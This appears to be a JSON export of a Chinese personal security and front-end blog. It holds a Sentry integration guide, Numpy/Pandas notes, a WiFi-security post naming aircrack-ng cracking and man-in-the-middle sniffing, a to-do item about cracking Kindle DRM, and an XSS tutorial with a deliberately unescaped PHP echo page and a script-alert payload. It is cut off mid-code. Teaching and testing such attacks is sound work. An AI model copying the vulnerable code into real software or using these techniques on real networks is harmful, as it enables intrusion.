{"pages":[{"title":"","text":"此处友链，只限熟人 个人博客 Finger LonelyRain Matrixbirds 4ido10n 0x1ng VeroFess NightCharm kiven517 清枫 Tuuu Nya 社区媒体 白客联盟 云夕阁","link":"/friends/index.html"},{"title":"","text":"前端恋爱狗？","link":"/about/index.html"},{"title":"","text":"记录下每年的想要做的事情，以及事情的进度。 must 代表必须完成，should 代表最好完成 2019年这一年给自己的目标，大多都是关于基础复习。把之前自己薄弱的地方，重新捡起来学习一遍。 must: 重新学习C语言 must: 读完《C Primer Plus(第六版)中文版》 must: 读完《C程序设计语言(第2版·新版)》 must: 读完《C和指针》 should: 读完《C专家编程》 must: 学习基础算法知识 must: 读完《算法图解》 must: 重新学习正则表达式 must: 读完《学习正则表达式》 must: 完成kindle电子书自动化脚本 should: 使用Nodejs完成amazon的自动借阅功能 must: 使用Nodejs完成自动破解kindle的DRM破解脚本 must: 使用Nodejs完成电子书自动重命名脚本 must: 使用Nodejs完成电子书自动转化格式脚本 should: 读点其他的书籍 should: 《向上管理的艺术：如何正确汇报工作》 should: 《把时间当朋友》 should: 《深度思维：透过复杂直抵本质的跨越式成长方法论》 should: 完成AutoFindXss 2.0版本","link":"/todo/index.html"}],"posts":[{"title":"JavaScript集成Sentry","text":"Sentry-JavaScript Sentry是一套用于捕获产品错误的开源项目，其下支持很多语言、框架。 这里就只阐述在前端JavaScript方向的处理操作 在我们公司之前的应用场景里，很多项目都是使用kibana来做信息统计。但是我们无法清楚的知道应用的运行状态是怎么样的。当某个客户在使用我们开发产品时，如果报错、崩溃。用户只能向客服寻求帮助，再交接给我们的开发人员进行复现、修复。其中因为不清楚具体的数据，开发人员是在复现时会非常的耗时。 而Sentry的用途就是解决这一痛点问题，让开发人员快速准确的定位到问题的根源所在，以达到快速修复，让开发人员更注重于开发新的功能上面。减少时间资源上的浪费。 JavaScript接入因为Sentry使用的是一种Hook错误函数的技术，来达到捕获错误的目的，所以我们基本可以无损耗的接入到现有的项目中去。 下面是React与Sentry进行结合的一些基本步骤。React: 123456789101112131415161718192021222324#SentryBoundary.jsimport { Component } from \"react\";import Raven from \"raven-js\";export default class SentryBoundary extends Component { constructor(props) { super(props); this.state = { error: null }; } componentDidCatch(error, errorInfo) { this.setState({ error }); // 发送错误信息 Raven.captureException(error, { extra: errorInfo }); } render() { if (this.state.error) { // 此处可以写成组件，当组件崩溃后，可以替换崩溃的组件 console.log(\"React Error\"); } return this.props.children; }} 12345678910111213#index.jsRaven.config(\"DSN\", { release: release,}).install();ReactDOM.render( &lt;div&gt; &lt;SentryBoundary&gt; &lt;App /&gt; &lt;/SentryBoundary&gt; &lt;/div&gt;, document.getElementById(\"root\")); 上传source-map如果上面的代码已经配置好后，那么现在的应用是可以捕获到错误的，但是存在了一个问题，我们目前的项目大多都使用webpack进行打包，而打包后的代码是混淆加密的代码，无法让我们准确的知道抛出错误的位置在哪里。所以我们需要上传source-map和混淆后的文件一起上传到Sentry服务器上。方便我们快速查找到问题所在的位置。 这个上传的配置及命令是比较繁琐的。也是项目结合Sentry的一个难点。 上传source-map目前有两种方式： 使用Sentry提供的Webpack插件进行配置，但是其灵活性不高。 使用sentry-cli的，其灵活性比较高，可以针对不同项目进行单独的配置。 其配置较为繁琐，这里就不在阐述。具体的React与Sentry结合的例子。可见我在github上的项目: react-sentry-demo。对每个配置都有详细的说明。其中的上传source-map，我使用的是第二种方法，并写了一个脚本，实现了: 打包、环境检测、认证检测、上传source-map、删除本地source-map的操作，完成自动化，可以把脚本直接迁移到现有的项目中去，改动也不会太大。 其核心上传命令如下: 1sentry-cli releases files v1.8 upload-sourcemaps {js文件和js.map所在目录。如果没有找到，sentry会遍历其子目录} --url-prefix '~/{过滤规则}'`; 浅入原理在JavaScript中是有window.onerror这个方法的，而Sentry在前端的核心捕获原理，就是通过重写此方法，来对所有的错误进行捕获。其实现的代码大致如下: 123456789let _winError = window.onerror;window.onerror = function (message, url, lineNo, colNo, errorObj) { console.log(` 错误信息: ${message} 错误文件地址: ${url} 错误行号: ${lineNo} 错误列号: ${colNo} 错误的详细信息 ${errorObj}`);} 然后Sentry的工作就是获取非错误的数据，如: user-agent、浏览器信息、系统信息、自定义信息等信息，然后交给Sentry的生命周期函数，最后在把数据发送到Sentry服务端，进行错误信息展示。 兼容性这里所说的兼容性，其实也就是window.onerror的兼容性 运行环境兼容性 环境 message url lineNo colNo errorObj Firefox ✓ ✓ ✓ ✓ ✓ Chrom ✓ ✓ ✓ ✓ ✓ Edge ✓ ✓ ✓ ✓ ✓ IE 11 ✓ ✓ ✓ ✓ ✓ IE 10 ✓ ✓ ✓ ✓ IE 9 ✓ ✓ ✓ ✓ IE 8 ✓ ✓ ✓ Safari 10 and up ✓ ✓ ✓ ✓ ✓ Safari 9 ✓ ✓ ✓ ✓ Opera 15+ ✓ ✓ ✓ ✓ ✓ Android Browser 4.4 ✓ ✓ ✓ ✓ Android Browser 4 - 4.3 ✓ ✓ 微信webview(安卓) ✓ ✓ ✓ ✓ 微信webview(IOS) ✓ ✓ ✓ ✓ ✓ WKWebview ✓ ✓ ✓ ✓ ✓ UIWebview ✓ ✓ ✓ ✓ ✓ 标签兼容性 标签 window.onerror是否能捕获 img 可以 script 需要再script标签添加crossorigin属性，并在服务端允许跨域。如果不使用这个属性，错误信息只会显示Script error. css 不能 iframe 不能 可以发现其浏览器都支持此方法。只是有些运行环境不支持colNo和errorObj，但是这块，Sentry已经帮你处理好了，所以不用担心。只是会在展示错误的时候，信息不太完整而已。 所能捕获的信息错误信息从上面的浅入原理可以看到，其核心捕获是window.onerror。那么只要它可以捕获到的错误，都会发送到Sentry上。 而window.onerror能捕获到的错误，除了Promise，基本上能在控制台出现的错误，都会捕获到。也就是运行时的错误，包括语法错误。 关于捕获Promise错误的方案，可以使用: window.addEventListener('unhandledrejection', event =&gt; {}) 来进行捕获，但是此事件的兼容性不太好，目前只有webkit内核支持这个事件。 如下代码，是此方法所能捕获到的: 12345const p = new Promise((reslove, reject) =&gt; reject('Error'))p.then(data =&gt; { console.log(data)})// Promise触发了reject回调函数，但是却没有相应到catch来应对。从而导致报错。 面包屑信息 Ajax请求 URL地址的变化 UI点击和按下的DOM事件 控制台的console信息 之前的错误 自定义的面包屑信息 展示信息 Electron集成这里的集成，也不是说捕获Electron应用的错误，而是崩溃。因为Electron只是一个容器，里面的内容还是JavaScript应用。 接入刚刚也说到这里的集成也只是去捕获Electron崩溃的信息。而当Electron崩溃时，会触发Electron的函数:crashReporter.start，那么我们在这个函数里去配置一下自己的sentry信息: 1234567891011import { crashReporter } from 'electron'crashReporter.start({ productName: 'aoc-desktop', companyName: 'alo7', submitURL: 'https://sentry.com/api/15376/minidump/?sentry_key=3e05fa101f035008e953ff56909b8eb', // sentry提供的minidump接口 extra: { // 额外信息 }}) 配置好后，可以使用process.crash()来模拟崩溃，以便查看Sentry是否能收到崩溃信息。 上传Symbol(符号表)在上面的应用说的是上传source-map，但是这里上传的是Symbol。可以把Symbol理解为另一种source-map。 Symbol的格式(后缀)有很多，Mac下是dSYM，windows是pdb。而在Sentry里，暂时是不支持上传pdb的。需要使用dump_syms.exe来把pdb格式转化成sym格式。再上传到Sentry里。这样就可以在Sentry崩溃的时候，看到起崩溃的上下文了。如下图: 这样就可以准确的定位到是哪里出现了问题。 浅入上传检索的原理当Sentry服务端收到source-map时，是通过你上传时的url-prefix信息，与source-map文件以及运行时的js文件，产生对应。流程图如下: 作者信息 Author: Black-Hole Blog: http://bugs.cc/ github: https://github.com/BlackHole1/ Twitter: https://twitter.com/Free_BlackHole Email: 158blackhole@gmail.com","link":"/2018/08/24/javaScript-integration-sentry/"},{"title":"Numpy & Pandas & Matplotilb部分API操作","text":"Numpy导入import numpy as np API创建数组1234567891011121314151617181920212223242526272829303132333435363738np.array([10, 11, 12, 13])# [10 11 12 13]np.array([10, 11, 12, 13, 14 ,15]).reshape([2,3])# [# [10 11 12]# [13 14 15]# ]np.array([[1, 2], [3, 4]])# [# [1 2]# [3 4]# ]np.arange(4)# [0 1 2 3]np.arange(2, 6)# [2 3 4 5]np.arange(4).reshape([2,2])# [# [0 1]# [2 3]# ]np.random.random([2,3])# [# [ 0.00136044 0.46854718 0.59149907]# [ 0.75636339 0.18204628 0.53191402]# ] 求值1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162arr = np.array([10, 11, 12, 13, 14 ,15]).reshape([2,3])# [# [10 11 12]# [13 14 15]# ]# 总数np.sum(arr, axis=0)# [23 25 27]np.sum(arr, axis=1)# [33 42]# 最小数np.min(arr, axis=0)# [10 11 12]np.min(arr, axis=1)# [10 13]# 最大数np.max(arr, axis=0)# [13 14 15]np.max(arr, axis=1)# [12 15]# 最大/小值得索引值np.argmin(arr)# 0 0是索引np.argmax(arr)# 5 5是索引# 平均值arr.mean()# np.mean(arr)# 12.5np.average(arr)# 12.5# 逐步增加np.cumsum(arr)# [10 21 33 46 60 75]# 相差np.diff(arr)# [# [1 1]# [1 1]# ]# 替换np.clip(arr, 11, 14)# [# [11 11 12]# [13 14 14]# ]# 小于11的数替换成11, 大于14的数替换成14, 其他数不变 索引1234567891011121314151617181920212223242526arr = np.arange(3, 15).reshape([3,4])# [# [ 3 4 5 6]# [ 7 8 9 10]# [11 12 13 14]# ]arr[1, 1]# arr[1][1]# 8arr[:, 1]# [ 4 8 12]arr[1, :]# [ 7 8 9 10]arr[1, 1:3]# [8 9]arr.flatten()# [ 3 4 5 6 7 8 9 10 11 12 13 14]for i in arr.flat: print(i)# 每行打印出值。arr.flat是迭代器 合并12345678910A = np.array([1, 1, 1])B = np.array([2, 2, 2])np.vstack((A, B))# [# [1 1 1]# [2 2 2]# ]np.hstack((A, B))# [1 1 1 2 2 2] 分割123456789101112131415161718arr = np.arange(12).reshape([3,4])# [# [ 0 1 2 3]# [ 4 5 6 7]# [ 8 9 10 11]# ]np.split(arr, 2, axis=1)# [array([# [0, 1],# [4, 5],# [8, 9]# ]),# array([# [ 2, 3],# [ 6, 7],# [10, 11]]# )] Pandas导入import pandas as pd API创建列表123456789101112131415161718192021222324252627282930313233343536373839404142pd.Series([1, 3, 6, np.nan, 44, 1])# 0 1.0# 1 3.0# 2 6.0# 3 NaN# 4 44.0# 5 1.0# dtype: float64pd.date_range('20171108', periods=6)# DatetimeIndex(# ['2017-11-08', '2017-11-09', '2017-11-10', '2017-11-11','2017-11-12', '2017-11-13'],# dtype='datetime64[ns]', # freq='D'# )dates = pd.date_range('20171108', periods=6)pd.DataFrame(np.random.randn(6, 4), index=dates, columns=['a', 'b', 'c', 'd'])# a b c d# 2017-11-08 0.644350 1.122020 -1.263401 0.163371# 2017-11-09 0.573329 -0.242054 -0.342220 1.070905# 2017-11-10 0.714291 -0.721509 -2.298672 -0.513572# 2017-11-11 -0.614927 2.010482 -1.369179 -0.901276# 2017-11-12 0.709672 -0.430620 1.070244 -2.308874# 2017-11-13 1.284080 1.169807 1.668942 0.859300pd.DataFrame({ 'A': 1., 'B': pd.Timestamp('20171108'), 'C': pd.Series(1, index=list(range(4)), dtype='float32'), 'D': np.array([3] * 4, dtype='int32'), 'E': pd.Categorical(['test', 'train', 'test', 'train']), 'F': 'foo'})# A B C D E F# 0 1.0 2017-11-08 1.0 3 test foo# 1 1.0 2017-11-08 1.0 3 train foo# 2 1.0 2017-11-08 1.0 3 test foo# 3 1.0 2017-11-08 1.0 3 train foo 选择获取123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475datas = pd.DataFrame({ 'A': 1., 'B': pd.Timestamp('20171108'), 'C': pd.Series(1, index=list(range(4)), dtype='float32'), 'D': np.array([3] * 4, dtype='int32'), 'E': pd.Categorical(['test', 'train', 'test', 'train']), 'F': 'foo'})# A B C D E F# 0 1.0 2017-11-08 1.0 3 test foo# 1 1.0 2017-11-08 1.0 3 train foo# 2 1.0 2017-11-08 1.0 3 test foo# 3 1.0 2017-11-08 1.0 3 train foodatas.A# datas['A']# 0 1.0# 1 1.0# 2 1.0# 3 1.0# Name: A, dtype: float64datas[0:3]# A B C D E F# 0 1.0 2017-11-08 1.0 3 test foo# 1 1.0 2017-11-08 1.0 3 train foo# 2 1.0 2017-11-08 1.0 3 test foodatas.loc[0]# 当index是类似'2017-11-8的时候', datas.loc['20171108']# A 1# B 2017-11-08 00:00:00# C 1# D 3# E test# F foo# Name: 0, dtype: objectdatas.loc[:,['A', 'B']]# A B# 0 1.0 2017-11-08# 1 1.0 2017-11-08# 2 1.0 2017-11-08# 3 1.0 2017-11-08datas.loc[[1, 3],['A', 'B']]# A B# 1 1.0 2017-11-08# 3 1.0 2017-11-08# icol是基于行号获取的, col是基于index获取的, ix是他们俩的混合(index、行号都可以)# icol[1]# ix[1]# 当index为2017-11-08时, ix['20171108']datas[datas.E == 'test']# A B C D E F# 2017-11-08 1.0 2017-11-08 1.0 3 test foo# 2017-11-10 1.0 2017-11-08 1.0 3 test foodatas.index# Int64Index([0, 1, 2, 3], dtype='int64')datas.columns# Index([u'A', u'B', u'C', u'D', u'E', u'F'], dtype='object')datas.values# array(# [# [1.0, Timestamp('2017-11-08 00:00:00'), 1.0, 3, 'test', 'foo'],# [1.0, Timestamp('2017-11-08 00:00:00'), 1.0, 3, 'train', 'foo'],# [1.0, Timestamp('2017-11-08 00:00:00'), 1.0, 3, 'test', 'foo'],# [1.0, Timestamp('2017-11-08 00:00:00'), 1.0, 3, 'train', 'foo']# ],# dtype=object) 排序1234567891011121314151617181920datas.sort_index(axis=0, ascending=False)# F E D C B A# 0 foo test 3 1.0 2017-11-08 1.0# 1 foo train 3 1.0 2017-11-08 1.0# 2 foo test 3 1.0 2017-11-08 1.0# 3 foo train 3 1.0 2017-11-08 1.0datas.sort_index(axis=0, ascending=False)# A B C D E F# 3 1.0 2017-11-08 1.0 3 train foo# 2 1.0 2017-11-08 1.0 3 test foo# 1 1.0 2017-11-08 1.0 3 train foo# 0 1.0 2017-11-08 1.0 3 test foodatas.sort_values(by='E')# A B C D E F# 0 1.0 2017-11-08 1.0 3 test foo# 2 1.0 2017-11-08 1.0 3 test foo# 1 1.0 2017-11-08 1.0 3 train foo# 3 1.0 2017-11-08 1.0 3 train foo 设置值12345678910111213141516171819202122232425262728293031323334353637datas = pd.DataFrame({ 'A': pd.Series([1, 5, 'test', 'foo'], index=list(range(4))), 'B': pd.Series([np.nan, 1, np.nan, 'test'], index=list(range(4))), 'C': pd.Series(1, index=list(range(4)), dtype='float32'),})# A B C# 0 1 NaN 1.0# 1 5 1 1.0# 2 test NaN 1.0# 3 foo test 1.0datas.dropna(axis=0, how='any')# 当axis是1时，则判断竖向里是否含有NaN的值# how = 'any' || 'all' 默认是any# 当是any的时候, 有一个值是NaN的时, 就删除这一行。# 当时all的时候, 这一行全部为NaN时, 就删除这一行# A B C# 1 5 1 1.0# 3 foo test 1.0datas.fillna(value=0)# A B C# 0 1 0 1.0# 1 5 1 1.0# 2 test 0 1.0# 3 foo test 1.0datas.isnull()# A B C# 0 False True False# 1 False False False# 2 False True False# 3 False False False# 当数据特别大的时候, 或者只想判断是否有值是NaN的值时# np.any(datas.isnull()) == True# 当有值时NaN时, 将返回True 导入导出12345678910111213pd.read_csv('***.csv',delimiter=',',encoding='utf-8',names=['test1','test2','test3'])# 参数一：读取的目标文件# 参数二：csv文件的分隔符# 参数三：编码# 参数四：设置列名# test1 test2 test3# 0 2017-11-18 ABC 51315.0# 1 2017-11-19 DEF 5659.0# 2 2017-11-20 GHI 1599.0# 3 2017-11-21 JKL 2224.0datas.to_csv('**.csv') 合并concat1234567891011121314151617181920212223242526272829303132333435datas1 = pd.DataFrame(np.ones((3, 4)) * 0, columns=['a', 'b', 'c', 'd'])# a b c d# 0 0.0 0.0 0.0 0.0# 1 0.0 0.0 0.0 0.0# 2 0.0 0.0 0.0 0.0datas2 = pd.DataFrame(np.ones((3, 4)) * 1, columns=['a', 'b', 'c', 'd'])# a b c d# 0 1.0 1.0 1.0 1.0# 1 1.0 1.0 1.0 1.0# 2 1.0 1.0 1.0 1.0datas3 = pd.DataFrame(np.ones((3, 4)) * 2, columns=['a', 'b', 'c', 'd'])# a b c d# 0 2.0 2.0 2.0 2.0# 1 2.0 2.0 2.0 2.0# 2 2.0 2.0 2.0 2.0pd.concat([datas1, datas2, datas3], axis=0, ignore_index=True)# a b c d# 0 0.0 0.0 0.0 0.0# 1 0.0 0.0 0.0 0.0# 2 0.0 0.0 0.0 0.0# 3 1.0 1.0 1.0 1.0# 4 1.0 1.0 1.0 1.0# 5 1.0 1.0 1.0 1.0# 6 2.0 2.0 2.0 2.0# 7 2.0 2.0 2.0 2.0# 8 2.0 2.0 2.0 2.0pd.concat([datas1, datas2, datas3], axis=1)# a b c d a b c d a b c d# 0 0.0 0.0 0.0 0.0 1.0 1.0 1.0 1.0 2.0 2.0 2.0 2.0# 1 0.0 0.0 0.0 0.0 1.0 1.0 1.0 1.0 2.0 2.0 2.0 2.0# 2 0.0 0.0 0.0 0.0 1.0 1.0 1.0 1.0 2.0 2.0 2.0 2.0 concat 部分参数 在concat里, join的默认参数时outer 1234567891011121314151617181920212223242526272829303132333435363738394041datas1 = pd.DataFrame(np.ones((3, 4)) * 0, columns=['a', 'b', 'c', 'd'], index=[1, 2, 3])# a b c d# 1 0.0 0.0 0.0 0.0# 2 0.0 0.0 0.0 0.0# 3 0.0 0.0 0.0 0.0datas2 = pd.DataFrame(np.ones((3, 4)) * 1, columns=['b', 'c', 'd', 'e'], index=[2, 3, 4])# b c d e# 2 1.0 1.0 1.0 1.0# 3 1.0 1.0 1.0 1.0# 4 1.0 1.0 1.0 1.0pd.concat([datas1, datas2], join='outer')# a b c d e# 1 0.0 0.0 0.0 0.0 NaN# 2 0.0 0.0 0.0 0.0 NaN# 3 0.0 0.0 0.0 0.0 NaN# 2 NaN 1.0 1.0 1.0 1.0# 3 NaN 1.0 1.0 1.0 1.0# 4 NaN 1.0 1.0 1.0 1.0pd.concat([datas1, datas2], join='inner')# b c d# 1 0.0 0.0 0.0# 2 0.0 0.0 0.0# 3 0.0 0.0 0.0# 2 1.0 1.0 1.0# 3 1.0 1.0 1.0# 4 1.0 1.0 1.0pd.concat([datas1, datas2], axis=1, join_axes=[datas2.index])# a b c d b c d e# 2 0.0 0.0 0.0 0.0 1.0 1.0 1.0 1.0# 3 0.0 0.0 0.0 0.0 1.0 1.0 1.0 1.0# 4 NaN NaN NaN NaN 1.0 1.0 1.0 1.0# 如果没有join_axes值时:# a b c d b c d e# 1 0.0 0.0 0.0 0.0 NaN NaN NaN NaN# 2 0.0 0.0 0.0 0.0 1.0 1.0 1.0 1.0# 3 0.0 0.0 0.0 0.0 1.0 1.0 1.0 1.0# 4 NaN NaN NaN NaN 1.0 1.0 1.0 1.0 append12345678910111213141516171819datas1 = pd.DataFrame(np.ones((3, 4)) * 0, columns=['a', 'b', 'c', 'd'])# a b c d# 0 0.0 0.0 0.0 0.0# 1 0.0 0.0 0.0 0.0# 2 0.0 0.0 0.0 0.0datas2 = pd.Series([1, 2, 3, 4], index=['a', 'b', 'c', 'd'])# a 1# b 2# c 3# d 4# dtype: int64datas1.append(datas2, ignore_index=True)# a b c d# 0 0.0 0.0 0.0 0.0# 1 0.0 0.0 0.0 0.0# 2 0.0 0.0 0.0 0.0# 3 1.0 2.0 3.0 4.0 merge12345678910111213141516171819202122232425262728left = pd.DataFrame({ 'key': ['k0', 'k1', 'k2', 'k3'], 'A': ['A0', 'A1', 'A2', 'A3'], 'B': ['B0', 'B1', 'B2', 'B3']})# A B key# 0 A0 B0 k0# 1 A1 B1 k1# 2 A2 B2 k2# 3 A3 B3 k3right = pd.DataFrame({ 'key': ['k0', 'k1', 'k2', 'k3'], 'C': ['C0', 'C1', 'C2', 'C3'], 'D': ['D0', 'D1', 'D2', 'D3']})# C D key# 0 C0 D0 k0# 1 C1 D1 k1# 2 C2 D2 k2# 3 C3 D3 k3pd.merge(left, right, on='key')# A B key C D# 0 A0 B0 k0 C0 D0# 1 A1 B1 k1 C1 D1# 2 A2 B2 k2 C2 D2# 3 A3 B3 k3 C3 D3 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354left = pd.DataFrame({ 'key1': ['k0', 'k0', 'k1', 'k2'], 'key2': ['k0', 'k1', 'k0', 'k1'], 'A': ['A0', 'A1', 'A2', 'A3'], 'B': ['B0', 'B1', 'B2', 'B3']})# A B key1 key2# 0 A0 B0 k0 k0# 1 A1 B1 k0 k1# 2 A2 B2 k1 k0# 3 A3 B3 k2 k1right = pd.DataFrame({ 'key1': ['k0', 'k1', 'k1', 'k2'], 'key2': ['k0', 'k0', 'k0', 'k0'], 'C': ['C0', 'C1', 'C2', 'C3'], 'D': ['D0', 'D1', 'D2', 'D3']})# C D key1 key2# 0 C0 D0 k0 k0# 1 C1 D1 k1 k0# 2 C2 D2 k1 k0# 3 C3 D3 k2 k0pd.merge(left, right, on=['key1', 'key2'], how='inner')# how默认是inner# A B key1 key2 C D# 0 A0 B0 k0 k0 C0 D0# 1 A2 B2 k1 k0 C1 D1# 2 A2 B2 k1 k0 C2 D2pd.merge(left, right, on=['key1', 'key2'], how='outer')# A B key1 key2 C D# 0 A0 B0 k0 k0 C0 D0# 1 A1 B1 k0 k1 NaN NaN# 2 A2 B2 k1 k0 C1 D1# 3 A2 B2 k1 k0 C2 D2# 4 A3 B3 k2 k1 NaN NaN# 5 NaN NaN k2 k0 C3 D3pd.merge(left, right, on=['key1', 'key2']. how='right')# A B key1 key2 C D # 0 A0 B0 k0 k0 C0 D0 # 1 A2 B2 k1 k0 C1 D1 # 2 A2 B2 k1 k0 C2 D2 # 3 NaN NaN k2 k0 C3 D3pd.merge(left, right, on=['key1', 'key2'], how='left')# A B key1 key2 C D# 0 A0 B0 k0 k0 C0 D0# 1 A1 B1 k0 k1 NaN NaN# 2 A2 B2 k1 k0 C1 D1# 3 A2 B2 k1 k0 C2 D2# 4 A3 B3 k2 k1 NaN NaN matplotilb导入import matplotlib.pyplot as plt APIplot1234567891011121314151617data = pd.Series(np.random.randn(1000)) # 随机1000个数data = data.cumsum() # 累加# 因为pandas本来就是一个数据，所以可以直接plot,# 还有两种写法: plt.plot(x= , y = ) 或者 plt.plot([xxx, xxx], [yyy, yyy])data.plot()plt.rcParams['font.sans-serif']=['SimHei'] # 用来正常显示中文标签plt.rcParams['axes.unicode_minus']=False # 用来正常显示负号# linewidth线条的宽度# linestyle线条风格(-实线 --破折线 -.点划线 :虚线 None说明都不画)plt.plot([1,50,100],[1,4,9], linewidth=2.5, linestyle='--', label='lalala')plt.legend(loc='upper left') # 没有这句, 上面的label将不会显示plt.plot([1,100,200],[1,7,9]) # 第三个数据plt.title('Demo') # 标题plt.xlabel('xxx') # x轴名称plt.ylabel('yyy') # y轴名称plt.text(60, 10, u'说明文字') # 说明文字plt.show() # 显示 1234567# 随机1000行4列的数字, 行数从0到999, 列表为A B C Ddata = pd.DataFrame(np.random.randn(1000, 4), index=np.arange(1000), columns=list('ABCD'))data = data.cumsum() # 累加data.plot()plt.show() 其他图柱状图1plt.bar(left, height, width=0.8) 散点图1plt.scatter(x,y) 饼状图","link":"/2017/11/12/numpy-pandas-mateplotilb-some-api/"},{"title":"公司wifi安全","text":"0x0 前言： 很多的公司都没有安全团队，只有运维来负责整个公司的安全，从而安全问题也大打折扣。我最近一直在给各个公司做安全检测，就把自己的心得写下来，有什么不足之处还望补充。 0x1 无线安全： 很多的公司都有不怎么注重公司的无线电安全，有钱的公司买设备，没钱的公司搞人力。但是人的技术在好，没有设备的辅助，单纯的人力在厉害也没什么用。 很多的公司WIFI认证基本都是WPA/WPA2然后加个WEB二次认证，认为这样就万无一失了，而其实这并没有什么用。破解WPA，可以使用aircrack-ng、airmon-ng、airodump-ng、aireplay-ng来实现破解，WPA2使用字典穷举。 当然也可以使用大菠萝伪造一个WIFI。而大家也都知道有一款神器叫做“wifi万能钥匙”，可以先去看看wifi万能钥匙能不能解，不能解的话再破。连上WIFI后，将会提示你需要进行WEB二次认证。这里你完全可以弃之不理，因为它并没有什么用。 因为你是WPA/WPA2的认证方式，你连上WIFI之后，交换机就会马上分配给你一个内网IP（我遇到的是交换机，也可能是路由器）一个黑客要你外网干什么，他需要的是公司的内网资源。连不上网对黑客来说没有什么问题。我给某公司做安全检测的时候，万能钥匙破解—中间人嗅探。不到两分钟拿到了他们公司官网后台管理员的权限。 WEB认证在我看来不是针对于黑客的，是针对于员工的，因为黑客不需要外网资源，但是员工需要。下面是我画的图： 思维导图URL 黑客连入WIFI后，虽然WEB二次认证不了，但是黑客现在已经处于内网中，他可以访问内网的任何资源。 修复建议： 把WPA/WPA2无线认证换成802.1x认证方式（802.1x无线认证方式需要交换机的支持） 买针对无线检测/防御设备 无线不能访问内网资源，只有有线可以访问内网资源（从物理上隔绝问题） 关于802.1x认证方式，他的原理图是下面这样的: 思维导图URL 黑客即使连上公司WIFI，但是无法通过802.1x认证，导致 公司设备（路由器、交换机）无法分配给你内网IP和外网出口IP的资格。 0x2 较为深入无线安全： 像上面所讲，只是针对公司开放的WIFI进行管理。 而上面的三个解决方案，只有第一个相比之下是比较方便还不用花钱的（机房设备需要支持802.1x无线协议，不支持还是要花钱）。 第二个，公司如果不想花钱是不会选择的，而且买了还要配置，前期工作量特别大。 第三个，工作量大，需要重新架构公司网络，我和一个同事在下午6点下班后一直忙到第二天上班之前才搞定。 如果公司不想花钱或者运维不想重新架构的话，第一种是很好的选择，但是这里又有一个问题，360/百度随身WIFI，这个东西的存在，对那些本来就不怎么安全的公司更是雪上加霜。 360/百度随身WIFI插入公司电脑后，会开启ICS服务，加上自带的无线网卡AP功能。当你连上这个随身WIFI之后，相当于一个小型的局域网。这时我们可以先入侵那个插了随身WIFI的PC电脑，通过它来入侵整个公司。如果你只需要某个接口，则不需要入侵插了随身WIFI的PC电脑。这里假设下“我需要的是这个网站的后台，可是想要登陆这个网站后台，需要出口IP是这个公司的外网IP”这样的话，我们则不需要入侵插了随身WIFI的PC电脑来。为什么呢？我画了一个图，大家看下: 思维导图URL 黑客连入WIFI后，无需进行WEB二次认证，因为它使用的是员工的网络，员工也肯定认证过了，员工使用的是公司内网，内网有个统一的出口IP，而服务器端也只认这个IP，其他IP连不上服务器。 解决办法，网上很多，可以参考网上的教程。 如果你又更好的解决方案，可以提出来。我个人的思路有限。有不足之处，还望见谅。 作者信息： Author:Black-Hole Blog:http://bugs.cc/ github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","link":"/2016/12/13/company-wifi-security/"},{"title":"XSS的原理分析与解剖","text":"0×01 前言: 《xss攻击手法》一开始在互联网上资料并不多(都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲WEB安全》和cn4rry的《XSS跨站脚本攻击剖析与防御》才开始好转。 我这里就不说什么xss的历史什么东西了，xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下： 耗时间 有一定几率不成功 没有相应的软件来完成自动化攻击 前期需要基本的html、js功底，后期需要扎实的html、js、actionscript2/3.0等语言的功底 是一种被动的攻击手法 对website有http-only、crossdomian.xml没有用 但是这些并没有影响黑客对此漏洞的偏爱，原因不需要多，只需要一个“XSS几乎每个网站都存在，google、baidu、360等都存在。” 0x02 原理： 首先我们现在本地搭建个PHP环境(可以使用phpstudy安装包安装)，然后在index.php文件里写入如下代码: 1234567891011121314151617&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;XSS原理重现&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;xss_input&quot;&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;hr&gt; &lt;?php $xss = $_GET[&apos;xss_input&apos;]; echo &apos;你输入的字符为&lt;br&gt;&apos;.$xss; ?&gt; &lt;/body&gt;&lt;/html&gt; 然后，你会在页面看到这样的页面 我们试着输入abcd123，得到的结果为 我们在看看源代码 我们输入的字符串被原封不动的输出来了，那这里我们提出来一个假设，假设我们在搜索框输入&lt;script&gt;alert('xss')&lt;/script&gt;会出现什么呢？如果按照上面的例子来说，它应该存在第12行的&lt;br&gt;与&lt;/boby&gt;之间，变成&lt;br&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&lt;/boby&gt;，那应该会弹出对话框。 既然假设提出来，那我们来实现下这个假设成不成立吧。 我们输入&lt;script&gt;alert('xss')&lt;/script&gt;，得到的页面为 成功弹窗，这个时候基本上就可以确定存在xss漏洞。 我们在看看源代码 看来，我们的假设成功了，这节就说说XSS的原理，下面几节说说xss的构造和利用 0×03 xss利用输出的环境来构造代码: 上节说了xss的原理，但是我们的输出点不一在&lt;br&gt;和&lt;/boby&gt;里，可以出现在html标签的属性里，或者其他标签里面。所以这节很重要，因为不一定 当你输入 &lt;script&gt;alert('xss')&lt;/script&gt;就会弹窗。 先贴出代码:12345678910111213141516171819202122232425&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;XSS利用输出的环境来构造代码&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;center&gt; &lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt; &lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt; &lt;input type=&quot;text&quot; name=&quot;xss_input_value&quot; value=&quot;输入&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;hr&gt; &lt;?php $xss = 